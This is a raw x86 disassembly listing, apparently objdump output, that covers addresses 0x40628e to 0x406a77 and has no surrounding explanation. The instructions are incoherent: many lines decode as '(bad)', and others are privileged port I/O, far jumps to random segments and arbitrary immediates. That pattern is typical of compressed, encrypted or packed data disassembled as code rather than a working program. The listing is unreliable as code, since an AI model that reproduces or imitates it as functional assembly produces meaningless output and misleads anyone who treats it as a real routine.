  40628e:	sub    BYTE PTR [edi-0x3750426f],bh
  406294:	out    dx,eax
  406295:	push   0x13e3eede
  40629a:	shl    BYTE PTR [ebx+0x72f116ec],0x45
  4062a1:	pop    ebx
  4062a2:	adc    ah,BYTE PTR [edi-0x5f85340b]
  4062a8:	jl     0x406248
  4062aa:	loop   0x40626a
  4062ac:	mov    dl,0x9a
  4062ae:	dec    ecx
  4062af:	mov    esi,0x631238c9
  4062b4:	mov    cl,0x1
  4062b6:	pop    ecx
  4062b7:	repnz stos BYTE PTR es:[edi],al
  4062b9:	or     ebx,DWORD PTR [esi+0xf83ec71]
  4062bf:	aam    0xe6
  4062c1:	fcmovnb st,st(1)
  4062c3:	cmp    eax,DWORD PTR [ebp*1+0x5c34de78]
  4062ca:	gs je  0x40633b
  4062cd:	xchg   esp,eax
  4062ce:	cmp    al,BYTE PTR [ebp-0x3d]
  4062d1:	and    BYTE PTR [esi-0x6a],0x93
  4062d5:	pop    ecx
  4062d6:	mov    ch,0x0
  4062d8:	adc    BYTE PTR [esi+0x74],ah
  4062db:	scas   eax,DWORD PTR es:[edi]
  4062dc:	cmp    DWORD PTR [esi+0x57],0xba73e689
  4062e3:	and    ebp,esp
  4062e5:	dec    edx
  4062e6:	xor    BYTE PTR [edi+eiz*4],dh
  4062e9:	fdivr  QWORD PTR [esp+ebx*8-0x59048753]
  4062f0:	xchg   ebp,eax
  4062f1:	cmp    eax,0xb0b6453e
  4062f6:	sub    BYTE PTR ds:0x562624d7,bl
  4062fc:	out    dx,al
  4062fd:	mov    al,0xaf
  4062ff:	loopne 0x406329
  406301:	rcr    BYTE PTR [esi+0x1ebaa2ee],cl
  406307:	or     al,0xc9
  406309:	xchg   DWORD PTR [esi-0x5f],edx
  40630c:	pop    ebp
  40630d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40630e:	mov    edi,0xa3d8b624
  406313:	pop    edx
  406314:	retf   0xe4a8
  406317:	adc    DWORD PTR [esi-0x19e3d5eb],ebp
  40631d:	push   cs
  40631e:	pop    esi
  40631f:	in     al,dx
  406320:	mov    dl,0x76
  406322:	lods   eax,DWORD PTR ds:[esi]
  406323:	inc    edx
  406324:	xchg   BYTE PTR [edx+0x5c],dh
  406327:	sbb    ah,BYTE PTR [ebx]
  406329:	sub    BYTE PTR [ebx],0xd9
  40632c:	xchg   esp,eax
  40632d:	pop    ebx
  40632e:	mov    eax,ds:0x336f80b4
  406333:	xchg   BYTE PTR [ebp-0x189a9b7b],ah
  406339:	in     al,0x2
  40633b:	jp     0x406325
  40633d:	mov    ebx,edx
  40633f:	dec    edx
  406340:	inc    esi
  406341:	dec    ebp
  406342:	add    al,0x3d
  406344:	mov    ch,0x19
  406346:	sub    ebx,DWORD PTR [ebx+esi*8-0x7df11bb2]
  40634d:	fwait
  40634e:	sub    eax,0xc8e23fc6
  406353:	sahf   
  406354:	fadd   DWORD PTR [eax-0x5a]
  406357:	xor    dl,al
  406359:	add    eax,0x91f85e01
  40635e:	in     al,0x6a
  406360:	dec    ah
  406362:	cs pushf 
  406364:	std    
  406365:	test   BYTE PTR [eax-0x55],bh
  406368:	in     eax,dx
  406369:	push   esi
  40636a:	call   0x2dc7:0x932cfafa
  406371:	xor    ah,bl
  406373:	call   0x5a7ef8fc
  406378:	fld    TBYTE PTR [ebx-0x11]
  40637b:	(bad)  
  40637c:	retf   
  40637d:	shl    ch,1
  40637f:	pop    ebp
  406380:	mov    ss,WORD PTR [ecx+0x2f172f38]
  406386:	lods   al,BYTE PTR ds:[esi]
  406387:	ds adc al,0xa2
  40638a:	xor    DWORD PTR [edi-0x5a],ecx
  40638d:	ret    
  40638e:	stos   BYTE PTR es:[edi],al
  40638f:	add    dl,BYTE PTR es:[edi]
  406392:	(bad)  
  406393:	cmp    cl,dh
  406395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406396:	inc    esi
  406397:	nop
  406398:	in     eax,dx
  406399:	dec    ecx
  40639a:	sbb    eax,0xd4b1e25b
  40639f:	div    DWORD PTR ss:[edx]
  4063a2:	jb     0x4063bd
  4063a4:	xor    ecx,DWORD PTR [ebx+0x295daa62]
  4063aa:	leave  
  4063ab:	push   ebx
  4063ac:	call   0x317f:0x8dff752
  4063b3:	or     dl,BYTE PTR gs:[ecx-0xf]
  4063b7:	adc    BYTE PTR [esi-0x17],bh
  4063ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063bb:	or     al,0x5a
  4063bd:	mul    BYTE PTR [ebx-0x106bad50]
  4063c3:	sbb    esi,DWORD PTR [ecx]
  4063c5:	jns    0x40637d
  4063c7:	pop    ds
  4063c8:	repz fsubp st(2),st
  4063cb:	call   DWORD PTR [esi+0x64]
  4063ce:	ss mov esp,0x76237245
  4063d4:	int    0x2b
  4063d6:	stc    
  4063d7:	mov    cl,0xcc
  4063d9:	ja     0x4063ec
  4063db:	test   DWORD PTR [edi+0x4a0b7d9],0x333f2db0
  4063e5:	mov    eax,0x4d07006e
  4063ea:	adc    al,0xbb
  4063ec:	push   ecx
  4063ed:	and    BYTE PTR [ebx-0x66ca01f0],0x76
  4063f4:	xchg   ebx,eax
  4063f5:	mov    ebp,0xab35e35a
  4063fa:	loop   0x406447
  4063fc:	sub    BYTE PTR [edi],cl
  4063fe:	and    esp,esp
  406400:	test   eax,0x2579eaf8
  406405:	mov    edx,0x3338d2aa
  40640a:	inc    ebp
  40640b:	sbb    al,0x1a
  40640d:	mov    ch,0x1f
  40640f:	retf   
  406410:	or     al,0x72
  406412:	xchg   edi,eax
  406413:	xlat   BYTE PTR ds:[ebx]
  406414:	mov    ds:0x4e92f91b,al
  406419:	les    edx,FWORD PTR [ebx+0xc6d99d3]
  40641f:	out    dx,eax
  406420:	in     al,dx
  406421:	sbb    al,0x37
  406423:	mov    esi,0x3bdbe963
  406428:	jo     0x4063f1
  40642a:	push   ecx
  40642b:	fsubr  QWORD PTR [ebp+0x7bb0c326]
  406431:	xor    ebp,DWORD PTR [esi]
  406433:	xor    esi,eax
  406435:	aad    0x3a
  406437:	push   ss
  406438:	xor    eax,0xab3402c8
  40643d:	enter  0xdac4,0x4e
  406441:	call   0x58a486c1
  406446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406447:	leave  
  406448:	pop    esi
  406449:	mov    ebx,DWORD PTR [ebp+0x61]
  40644c:	arpl   WORD PTR [ebx+esi*1],ax
  40644f:	fiadd  WORD PTR [esi+0xf]
  406452:	loop   0x40644a
  406454:	ret    
  406455:	push   eax
  406456:	shl    ebx,1
  406458:	in     eax,0xc3
  40645a:	mov    eax,0x4f8908c9
  40645f:	cmp    bl,BYTE PTR [edi]
  406461:	jmp    0x75748d3b
  406466:	jno    0x40648d
  406468:	jno    0x4063f1
  40646a:	jle    0x406448
  40646c:	or     edx,esp
  40646e:	in     al,dx
  40646f:	xor    eax,0xceea9df
  406474:	call   0xb0d74b90
  406479:	outs   dx,DWORD PTR ds:[esi]
  40647a:	stc    
  40647b:	and    dh,0x49
  40647e:	je     0x406493
  406480:	xchg   ebp,eax
  406481:	scas   al,BYTE PTR es:[edi]
  406482:	sub    DWORD PTR [edx+0x60],ebx
  406485:	sbb    DWORD PTR [ebp+eiz*8+0x2e],ebp
  406489:	ret    
  40648a:	mov    ah,0x83
  40648c:	pop    es
  40648d:	cs aas 
  40648f:	mov    dl,0x91
  406491:	add    bh,BYTE PTR [esi+0x22a07948]
  406497:	pop    ss
  406498:	adc    bl,BYTE PTR [ecx-0x61]
  40649b:	lods   eax,DWORD PTR ds:[esi]
  40649c:	and    cl,BYTE PTR [edi+esi*4]
  40649f:	dec    ebp
  4064a0:	xchg   ecx,eax
  4064a1:	(bad)  
  4064a2:	fld    TBYTE PTR ss:[edx]
  4064a5:	inc    edx
  4064a6:	aam    0x2b
  4064a8:	dec    esi
  4064a9:	sbb    al,0x65
  4064ab:	inc    esp
  4064ac:	dec    eax
  4064ad:	ins    DWORD PTR es:[edi],dx
  4064ae:	jl     0x4064ae
  4064b0:	test   DWORD PTR gs:[edi-0x3d],edi
  4064b4:	jmp    0x4064a2
  4064b6:	and    edx,0x55
  4064b9:	xor    al,0xa0
  4064bb:	push   0xb3edebdf
  4064c0:	repz jmp 0x53d9a976
  4064c6:	sub    al,0xeb
  4064c8:	sar    BYTE PTR [ecx+0x4f2ee6df],cl
  4064ce:	sub    bh,0x4c
  4064d1:	adc    eax,eax
  4064d3:	test   DWORD PTR [ebp-0x2ff5aa49],ecx
  4064d9:	adc    edx,ecx
  4064db:	dec    edi
  4064dc:	popa   
  4064dd:	or     ebx,eax
  4064df:	and    esp,DWORD PTR [ebp+0x23]
  4064e2:	push   cs
  4064e3:	push   es
  4064e4:	aam    0x7d
  4064e6:	je     0x406516
  4064e8:	cli    
  4064e9:	inc    ecx
  4064ea:	push   0x30
  4064ec:	mov    dh,0x78
  4064ee:	bswap  esi
  4064f0:	addr16 nop
  4064f2:	mov    al,ds:0xc3a4a041
  4064f7:	or     al,0xd2
  4064f9:	pop    ebx
  4064fa:	std    
  4064fb:	lahf   
  4064fc:	stc    
  4064fd:	xchg   ecx,eax
  4064fe:	jbe    0x406548
  406500:	adc    BYTE PTR [eax+0x76],al
  406503:	xor    DWORD PTR [edi],esp
  406505:	dec    ebp
  406506:	dec    eax
  406507:	xchg   ecx,eax
  406508:	and    al,0xf1
  40650a:	and    ebx,edi
  40650c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40650d:	push   ss
  40650e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40650f:	int3   
  406510:	dec    ecx
  406511:	mov    dl,0x90
  406513:	jle    0x406533
  406515:	and    DWORD PTR [ebx+0x30],esi
  406518:	test   BYTE PTR [ebp+0x3d8501d3],ch
  40651e:	pop    ss
  40651f:	inc    esp
  406520:	mov    bl,0x55
  406522:	std    
  406523:	test   BYTE PTR [edi],ah
  406525:	dec    esi
  406526:	sbb    DWORD PTR ds:0xdc1f277c,eax
  40652c:	inc    esp
  40652d:	push   0x61956ee7
  406532:	lock mov BYTE PTR [ebx+0x58835ea5],al
  406539:	into   
  40653a:	and    BYTE PTR [esi+esi*4+0x1b8abb8],al
  406541:	aad    0xad
  406543:	nop
  406544:	fsub   QWORD PTR [ecx-0x4bd9b9e0]
  40654a:	icebp  
  40654b:	pop    eax
  40654c:	and    esi,DWORD PTR [esi-0x1a]
  40654f:	das    
  406550:	cdq    
  406551:	or     eax,0xfb9c0fed
  406556:	fild   WORD PTR [ebx+0x18fef83a]
  40655c:	into   
  40655d:	dec    esi
  40655e:	das    
  40655f:	mov    al,ds:0xc2b3b47b
  406564:	jmp    0x8302:0x6ebaff8e
  40656b:	push   edi
  40656c:	inc    ebx
  40656d:	pop    eax
  40656e:	rol    DWORD PTR [ebp-0x6c],cl
  406571:	push   esi
  406572:	push   edx
  406573:	dec    esp
  406574:	cli    
  406575:	scas   al,BYTE PTR es:[edi]
  406576:	sub    al,0x9e
  406578:	pop    ss
  406579:	xor    eax,0x2dffb890
  40657e:	iret   
  40657f:	rcl    BYTE PTR ds:0xf5547057,cl
  406585:	jae    0x40657b
  406587:	mov    eax,ds:0xbf7b655b
  40658c:	nop
  40658d:	(bad)  
  40658e:	or     al,0x43
  406590:	push   es
  406591:	jecxz  0x406569
  406593:	add    DWORD PTR [ebp-0x5ef8c676],ebx
  406599:	mov    ds:0xa149fc86,eax
  40659e:	mov    edi,edi
  4065a0:	gs dec ebx
  4065a2:	inc    ebx
  4065a3:	mov    ecx,eax
  4065a5:	jle    0x406584
  4065a7:	mov    eax,0x146dbf4d
  4065ac:	xor    esp,DWORD PTR [eax-0x25]
  4065af:	clc    
  4065b0:	sti    
  4065b1:	mov    ah,BYTE PTR [edi+0x68a0f28d]
  4065b7:	xlat   BYTE PTR ds:[ebx]
  4065b8:	xchg   ebx,eax
  4065b9:	out    0x17,al
  4065bb:	sbb    DWORD PTR [ecx+0x40],esi
  4065be:	fwait
  4065bf:	in     eax,0x2f
  4065c1:	add    eax,0x452a9c9e
  4065c6:	inc    edi
  4065c7:	mov    ds:0x89aae3c7,al
  4065cc:	xor    DWORD PTR [ebx],esp
  4065ce:	push   esp
  4065cf:	ret    0x8bfc
  4065d2:	add    eax,0xbac2b33f
  4065d7:	jmp    0x9859:0xf24a786b
  4065de:	xchg   ebp,eax
  4065df:	mov    bh,BYTE PTR [esi-0x3e958c24]
  4065e5:	push   ebp
  4065e6:	dec    esi
  4065e7:	mov    ch,0x76
  4065e9:	pop    ebp
  4065ea:	mov    al,ds:0xad14909d
  4065ef:	cs sub bl,0x9
  4065f3:	push   ecx
  4065f4:	retf   
  4065f5:	or     DWORD PTR [esi],0xffffffbd
  4065f8:	push   0x2a
  4065fa:	dec    edi
  4065fb:	pop    esi
  4065fc:	loope  0x406618
  4065fe:	repz or edx,ebx
  406601:	loopne 0x4065e4
  406603:	(bad)  
  406604:	cld    
  406605:	mov    cl,0x85
  406607:	sbb    BYTE PTR [esp+edi*4+0x777be4e3],ch
  40660e:	(bad)  
  406610:	and    dh,BYTE PTR [ecx]
  406612:	pop    ecx
  406613:	loop   0x40660d
  406615:	and    al,0x75
  406617:	lock outs dx,BYTE PTR ds:[esi]
  406619:	and    ebp,DWORD PTR ds:0x9cf05991
  40661f:	loop   0x406644
  406621:	mov    ebp,0x30ec8824
  406626:	rcl    DWORD PTR ss:[edi],1
  406629:	cmp    esp,ebx
  40662b:	mov    ecx,DWORD PTR [ebp-0x7b]
  40662e:	inc    eax
  40662f:	test   eax,0xc8d7feae
  406634:	add    DWORD PTR [ebx+0x27],ebp
  406637:	icebp  
  406638:	inc    esp
  406639:	sar    DWORD PTR [eax+ebx*8+0x969a8a3],1
  406640:	ds loop 0x406611
  406643:	cmc    
  406644:	and    bl,BYTE PTR [ecx]
  406646:	clc    
  406647:	mov    edx,0xf1630e25
  40664c:	jmp    0xb9cf:0x1f524073
  406653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406654:	sbb    ebp,DWORD PTR [esi+0x25]
  406657:	pop    ecx
  406658:	cli    
  406659:	mov    ebx,esp
  40665b:	imul   edi,DWORD PTR [edi+0x79],0xffffffd2
  40665f:	mov    DWORD PTR [esi+0xad178f4],esp
  406665:	mov    dh,0x11
  406667:	push   edi
  406668:	fstp   TBYTE PTR [edi+0x75296343]
  40666e:	es push es
  406670:	pushf  
  406671:	push   edi
  406672:	xchg   ebp,ecx
  406674:	test   eax,0xddbaa118
  406679:	fwait
  40667a:	jne    0x406606
  40667c:	(bad)  
  40667d:	in     eax,dx
  40667e:	retf   
  40667f:	and    dh,BYTE PTR ds:0x47b90fc5
  406685:	push   ecx
  406686:	lods   eax,DWORD PTR ds:[si]
  406688:	sahf   
  406689:	shr    BYTE PTR [edi+0x4cf04bfe],cl
  40668f:	std    
  406690:	push   eax
  406691:	mov    es,WORD PTR [edx-0x786dd7b9]
  406697:	add    dl,BYTE PTR [edx]
  406699:	pop    edi
  40669a:	pop    es
  40669b:	test   al,0xb7
  40669d:	je     0x4066f5
  40669f:	or     ecx,esi
  4066a1:	test   BYTE PTR es:[ebp-0x56004908],al
  4066a8:	jno    0x4066b6
  4066aa:	mov    cl,0x4e
  4066ac:	fwait
  4066ad:	jmp    0x472c:0x5e79b138
  4066b4:	stos   DWORD PTR es:[edi],eax
  4066b5:	cmp    bl,bl
  4066b7:	test   eax,0x8209f27f
  4066bc:	dec    ebx
  4066bd:	and    DWORD PTR ds:0x764e6ffa,ebp
  4066c3:	out    dx,al
  4066c4:	sbb    eax,0x81af2d10
  4066c9:	push   edi
  4066ca:	sub    al,BYTE PTR [ebx+0x74]
  4066cd:	aam    0xe8
  4066cf:	mov    bl,0x3f
  4066d1:	push   cs
  4066d2:	inc    ebp
  4066d3:	out    0xa,eax
  4066d5:	mov    edi,0x6432c7d3
  4066da:	xor    BYTE PTR [esi],dh
  4066dc:	in     eax,0x75
  4066de:	push   eax
  4066df:	call   0x4cd14851
  4066e4:	pusha  
  4066e5:	adc    eax,0x452b16b5
  4066ea:	push   esp
  4066eb:	lahf   
  4066ec:	mov    eax,ds:0xcbaee664
  4066f1:	mov    ebp,0xd9926ae7
  4066f6:	cli    
  4066f7:	xchg   esi,eax
  4066f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066f9:	push   esi
  4066fa:	push   ebx
  4066fb:	xor    cl,BYTE PTR [edi-0x20b0fbaa]
  406701:	inc    ebx
  406702:	and    BYTE PTR [edx],ch
  406704:	aas    
  406705:	xor    BYTE PTR [esi],ch
  406707:	ins    BYTE PTR es:[edi],dx
  406708:	or     eax,0xb2dd8c09
  40670d:	sub    ch,0x95
  406710:	inc    esi
  406711:	push   0xffffffc8
  406713:	add    ah,bl
  406715:	sub    DWORD PTR [ebx+0x5f],esp
  406718:	cs call 0x48030631
  40671e:	pop    ebx
  40671f:	ret    0x1e75
  406722:	repz push ebp
  406724:	xor    al,0x90
  406726:	cmp    BYTE PTR [esi],ch
  406728:	inc    eax
  406729:	(bad)  
  40672a:	mov    ds:0xea29abd,eax
  40672f:	sbb    bl,BYTE PTR [eax-0x1b]
  406732:	or     dl,dl
  406734:	or     al,0x47
  406736:	fs xchg esp,eax
  406738:	rdpmc  
  40673a:	imul   edx,ebp,0xffffffb1
  40673d:	ja     0x40672c
  40673f:	inc    eax
  406740:	mov    eax,0x7832cc3a
  406745:	jns    0x4066e7
  406747:	dec    edx
  406748:	and    esp,DWORD PTR [esi+0x21]
  40674b:	push   cs
  40674c:	cmc    
  40674d:	mov    dl,0x9b
  40674f:	lods   al,BYTE PTR ds:[esi]
  406750:	add    eax,0xe0e13e79
  406755:	out    dx,al
  406756:	jno    0x40678f
  406758:	mov    esp,0xe08b1b77
  40675d:	or     ecx,esi
  40675f:	enter  0xd289,0x20
  406763:	mov    ecx,0x5c317458
  406768:	cwde   
  406769:	xchg   BYTE PTR [ebp-0x4c],dh
  40676c:	push   esp
  40676d:	mov    DWORD PTR [edi+0x26a920c1],eax
  406773:	sbb    bl,BYTE PTR [esi-0x2631aeae]
  406779:	xor    bl,BYTE PTR [ebp-0x17]
  40677c:	cmp    bh,BYTE PTR [ebx+0x3a3152d5]
  406782:	ja     0x40679e
  406784:	pop    ss
  406785:	and    DWORD PTR [ecx+0x19],ebx
  406788:	fistp  WORD PTR [esi]
  40678a:	fisttp WORD PTR [ebx-0x75]
  40678d:	ins    BYTE PTR es:[edi],dx
  40678e:	aaa    
  40678f:	cwde   
  406790:	add    esi,DWORD PTR [edx+0x29982d19]
  406796:	loop   0x406756
  406798:	or     al,0x7c
  40679a:	loope  0x406790
  40679c:	adc    dh,BYTE PTR [ebp-0x54]
  40679f:	lea    esp,[eax+0x37dbaf7c]
  4067a5:	repz popf 
  4067a7:	push   esp
  4067a8:	mov    ebx,0x62b5c6ae
  4067ad:	outs   dx,BYTE PTR ds:[esi]
  4067ae:	fiadd  DWORD PTR [eax+0x8]
  4067b1:	inc    esi
  4067b2:	sub    eax,0xb5dd897d
  4067b7:	outs   dx,DWORD PTR ds:[esi]
  4067b8:	and    eax,0x1a7f714a
  4067bd:	xchg   DWORD PTR [ebp-0x76f60440],edx
  4067c3:	xlat   BYTE PTR ds:[ebx]
  4067c4:	inc    edx
  4067c5:	mov    eax,0x96e83b5c
  4067ca:	loopne 0x4067bb
  4067cc:	sub    DWORD PTR [ecx+ecx*8],esp
  4067cf:	std    
  4067d0:	into   
  4067d1:	into   
  4067d2:	out    dx,eax
  4067d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067d4:	outs   dx,BYTE PTR ss:[esi]
  4067d6:	mov    bh,0xbe
  4067d8:	push   ebp
  4067d9:	add    ebp,DWORD PTR [ecx]
  4067db:	xor    DWORD PTR [ebx],eax
  4067dd:	(bad)  
  4067de:	out    dx,al
  4067df:	sar    BYTE PTR [eax-0x223065cf],1
  4067e5:	adc    al,0xe
  4067e7:	mov    eax,0xa3014872
  4067ec:	push   esi
  4067ed:	fmul   st,st(0)
  4067ef:	sub    al,0x34
  4067f1:	shl    esp,0xf6
  4067f4:	dec    eax
  4067f5:	sub    edx,DWORD PTR [ebx]
  4067f7:	or     al,0xc4
  4067f9:	fisub  WORD PTR [ecx-0x27e64aff]
  4067ff:	fld    DWORD PTR [ebx+ebx*2+0x25f3599b]
  406806:	test   BYTE PTR [ebx+edi*1],dl
  406809:	xor    al,0x67
  40680b:	push   ebx
  40680c:	fild   DWORD PTR [ebx-0x6c]
  40680f:	les    ebp,FWORD PTR [ecx+0x5b072c5d]
  406815:	int3   
  406816:	std    
  406817:	fild   QWORD PTR [edx]
  406819:	(bad)  
  40681a:	mov    esp,0x694435c8
  40681f:	aad    0xba
  406821:	jo     0x406896
  406823:	(bad)  
  406824:	dec    ebx
  406825:	lock mov al,0xd7
  406828:	cmp    BYTE PTR [esi-0x2766bee1],bl
  40682e:	test   eax,0xad94e815
  406833:	frstor [edx+0x592a8784]
  406839:	jnp    0x4067f5
  40683b:	mov    ebp,0x78d46840
  406840:	jno    0x40685e
  406842:	addr16 xchg edi,eax
  406844:	sub    BYTE PTR [edx+0x43],dl
  406847:	cld    
  406848:	push   ecx
  406849:	daa    
  40684a:	xor    eax,0x3b792a80
  40684f:	mov    WORD PTR fs:[ebp+0x6a],es
  406853:	les    edx,FWORD PTR [esi-0x11fe7167]
  406859:	push   ds
  40685a:	sbb    ebp,DWORD PTR [ecx-0xd]
  40685d:	loope  0x4068cf
  40685f:	scas   al,BYTE PTR es:[edi]
  406860:	bound  esi,QWORD PTR [esi]
  406862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406863:	ret    0x7bfe
  406866:	mov    dh,al
  406868:	pop    edi
  406869:	int3   
  40686a:	jmp    0x4068b5
  40686c:	xchg   esi,eax
  40686d:	cmp    al,0x80
  40686f:	int    0x16
  406871:	aad    0xa1
  406873:	mov    ss,WORD PTR [eax+eiz*8-0x69403c85]
  40687a:	sub    DWORD PTR [ebp+0x577fd404],esi
  406880:	pop    ss
  406881:	loop   0x40683c
  406883:	int3   
  406884:	xchg   edx,eax
  406885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406886:	push   0x3c
  406888:	push   ecx
  406889:	mov    al,0xbc
  40688b:	std    
  40688c:	int3   
  40688d:	sub    DWORD PTR ds:0x3000b812,ebx
  406893:	shl    BYTE PTR [eax],0x67
  406896:	fbld   TBYTE PTR [ebx]
  406898:	enter  0x71b4,0x74
  40689c:	sbb    eax,0x53c1f1d1
  4068a1:	mov    bl,0x80
  4068a3:	in     al,dx
  4068a4:	adc    eax,DWORD PTR [ecx+0x3b]
  4068a7:	cld    
  4068a8:	loop   0x40682d
  4068aa:	call   FWORD PTR [eax+0x3a8a4b41]
  4068b0:	stos   BYTE PTR es:[edi],al
  4068b1:	test   al,0x36
  4068b3:	push   ss
  4068b4:	adc    cl,cl
  4068b6:	mov    DWORD PTR [ecx],esi
  4068b8:	pusha  
  4068b9:	aad    0x4f
  4068bb:	sbb    al,0x10
  4068bd:	retf   0xaf0e
  4068c0:	stos   BYTE PTR es:[edi],al
  4068c1:	jne    0x40687e
  4068c3:	mov    ecx,0xa032d9b4
  4068c8:	mov    WORD PTR [ebx+0xf],?
  4068cb:	or     eax,0xdacc4c80
  4068d0:	int    0x6
  4068d2:	cmp    eax,0xe8872d94
  4068d7:	out    0xd9,al
  4068d9:	shr    ecx,0x67
  4068dc:	imul   edi,DWORD PTR [eax+ebx*1-0xb513937],0xa
  4068e4:	out    0x93,al
  4068e6:	mov    ebx,0x46f714a9
  4068eb:	imul   ebx,DWORD PTR ss:[edi+esi*8+0x5a6fca71],0x83f8a9ee
  4068f7:	and    ebx,DWORD PTR [eax+esi*8-0x29]
  4068fb:	pop    ebx
  4068fc:	dec    ebx
  4068fd:	mov    edi,0x54506269
  406902:	jle    0x4068a4
  406904:	inc    ebx
  406905:	jp     0x406930
  406907:	cmp    edx,0xa31ee981
  40690d:	out    dx,eax
  40690e:	sbb    BYTE PTR [edx+0x16],ah
  406911:	jo     0x406962
  406913:	jle    0x4068bf
  406915:	cmp    al,0xcf
  406917:	or     DWORD PTR [edx],eax
  406919:	jbe    0x4068b0
  40691b:	or     esp,DWORD PTR [edx]
  40691d:	ja     0x406928
  40691f:	push   0x1fbd0dad
  406924:	dec    ebp
  406925:	push   0x51
  406927:	push   cs
  406928:	pushf  
  406929:	es mov bl,0x2d
  40692c:	xor    DWORD PTR [ebx-0x6f],0xa44b9155
  406933:	jl     0x4068e8
  406935:	out    dx,al
  406936:	xor    eax,0x99c1fc5f
  40693b:	inc    esi
  40693c:	add    BYTE PTR [ebx+0x49],bh
  40693f:	mov    esi,0x16e4b0a1
  406944:	dec    edx
  406945:	push   esi
  406946:	mov    ah,0x2e
  406948:	mov    esp,0xf210a200
  40694d:	xor    esp,DWORD PTR [eax+0x66dc0dd9]
  406953:	or     al,0x77
  406955:	scas   al,BYTE PTR es:[edi]
  406956:	test   DWORD PTR [edi-0x3a],ebx
  406959:	pop    DWORD PTR [ebx+0x7]
  40695c:	aam    0xd5
  40695e:	outs   dx,BYTE PTR ds:[esi]
  40695f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406960:	in     eax,dx
  406961:	ja     0x4069d2
  406963:	aam    0xee
  406965:	jbe    0x4068f6
  406967:	ror    DWORD PTR [ecx+0x43905201],cl
  40696d:	pop    eax
  40696e:	push   es
  40696f:	jg     0x4069c1
  406971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406972:	cld    
  406973:	fistp  WORD PTR [bx+si+0x79]
  406977:	sub    bh,BYTE PTR [ebp+0x7b]
  40697a:	scas   al,BYTE PTR es:[edi]
  40697b:	push   0xffffffce
  40697d:	test   al,0xa5
  40697f:	adc    DWORD PTR [edi-0x5c9f951c],esp
  406985:	setg   BYTE PTR [esi-0x34]
  406989:	ret    
  40698a:	retf   
  40698b:	rcr    ah,cl
  40698d:	ret    
  40698e:	jg     0x40691b
  406990:	inc    ebp
  406991:	xchg   esp,eax
  406992:	adc    BYTE PTR [edi+0x742b25e8],ah
  406998:	addr16 inc eax
  40699a:	sbb    DWORD PTR [edx-0x44],esp
  40699d:	pop    edi
  40699e:	btr    DWORD PTR [ebx],edi
  4069a1:	mov    esp,ebx
  4069a3:	push   eax
  4069a4:	stos   DWORD PTR es:[edi],eax
  4069a5:	call   0x4e801f94
  4069aa:	call   0xbd679731
  4069af:	xlat   BYTE PTR ds:[ebx]
  4069b0:	mov    edi,0x903f20c7
  4069b5:	aam    0x1a
  4069b7:	fwait
  4069b8:	adc    eax,0x7ebdb6df
  4069bd:	push   ds
  4069be:	mov    BYTE PTR [edx-0x35],bl
  4069c1:	pop    ebp
  4069c2:	add    BYTE PTR [esp+esi*1+0x60],dl
  4069c6:	in     al,0xaf
  4069c8:	imul   BYTE PTR [ebp-0x6ae21116]
  4069ce:	mov    ebp,0x93833d5e
  4069d3:	gs inc esi
  4069d5:	sbb    al,0xd7
  4069d7:	adc    eax,0xed8af92a
  4069dc:	inc    edx
  4069dd:	pop    ebp
  4069de:	jp     0x406a2d
  4069e0:	mov    ds:0x27097ea5,al
  4069e5:	fcom   QWORD PTR [ebx+0x28]
  4069e8:	stc    
  4069e9:	cmp    cl,BYTE PTR [eax]
  4069eb:	mov    gs,WORD PTR [edx+0x7ee2c4c3]
  4069f1:	leave  
  4069f2:	and    edx,DWORD PTR [edx]
  4069f4:	xchg   ebp,eax
  4069f5:	icebp  
  4069f6:	popf   
  4069f7:	sub    eax,0x1e7229a
  4069fc:	jmp    0x4069f1
  4069fe:	dec    eax
  4069ff:	sbb    DWORD PTR [edi-0x115af34e],esi
  406a05:	pusha  
  406a06:	gs pop ebx
  406a08:	add    bl,BYTE PTR [ebp+0x5e19404a]
  406a0e:	(bad)  
  406a0f:	mov    bl,0x8d
  406a11:	xchg   esi,eax
  406a12:	aad    0x91
  406a14:	push   eax
  406a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a16:	jecxz  0x4069bf
  406a18:	aas    
  406a19:	lods   eax,DWORD PTR ds:[esi]
  406a1a:	mov    bl,0x24
  406a1c:	or     BYTE PTR [edx+ecx*4-0x4f482ae6],dl
  406a23:	iret   
  406a24:	cmc    
  406a25:	xchg   DWORD PTR [eax],ebx
  406a27:	bound  ebx,QWORD PTR [eax-0x25ffe5bd]
  406a2d:	ret    
  406a2e:	mov    edx,0x40ebd76f
  406a33:	lods   eax,DWORD PTR ds:[esi]
  406a34:	neg    DWORD PTR [ecx]
  406a36:	add    eax,0x815cbb9c
  406a3b:	mov    ah,0x1a
  406a3d:	inc    ecx
  406a3e:	int3   
  406a3f:	and    BYTE PTR [eax+ebx*8+0x1b8e681],dh
  406a46:	fidiv  WORD PTR [ebx-0x38]
  406a49:	fcmovb st,st(3)
  406a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a4c:	pop    ebp
  406a4d:	cmp    bl,BYTE PTR [ebp-0x36cc1ec6]
  406a53:	push   ss
  406a54:	inc    esi
  406a55:	stos   DWORD PTR es:[edi],eax
  406a56:	arpl   WORD PTR [ecx-0x64533e38],si
  406a5c:	mov    ?,WORD PTR [ebx+0x12]
  406a5f:	jne    0x406a27
  406a61:	and    DWORD PTR [esi+0xc],0x3c
  406a65:	mov    bh,0x27
  406a67:	cs ins DWORD PTR es:[edi],dx
  406a69:	aam    0x53
  406a6b:	test   BYTE PTR [ecx],bh
  406a6d:	or     BYTE PTR fs:[esi-0x45],0x30
  406a72:	(bad)  
  406a73:	xchg   ebp,eax
  406a74:	and    al,0x9b
  406a76:	pop    ebx
  406a77:	inc    eax
